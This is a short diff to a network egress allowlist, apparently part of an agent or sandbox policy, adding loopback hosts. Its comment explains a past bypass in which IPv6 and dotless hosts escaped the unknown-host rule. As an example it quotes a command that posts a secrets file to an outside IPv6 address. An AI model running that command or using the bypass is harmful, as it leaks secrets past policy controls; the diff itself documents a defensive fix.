@@ -2026,6 +2026,15 @@ egress_allowlist:
   - crates.io
   - static.crates.io
   - pypi.org
+  # Loopback. Task 6 makes dotless and IPv6 hosts visible to policy — previously
+  # they produced NO host at all, which meant the unknown-host rule had nothing to
+  # compare and silently never fired (a real bypass: `curl -d @secrets
+  # http://[2001:db8::1]/`). Loopback is allowed by default because local dev
+  # servers are ordinary and prompting on them would be pure noise; the point is
+  # that a rule *can* now target it.
+  - localhost
+  - 127.0.0.1
+  - "::1"
 
 default: allow
 ```
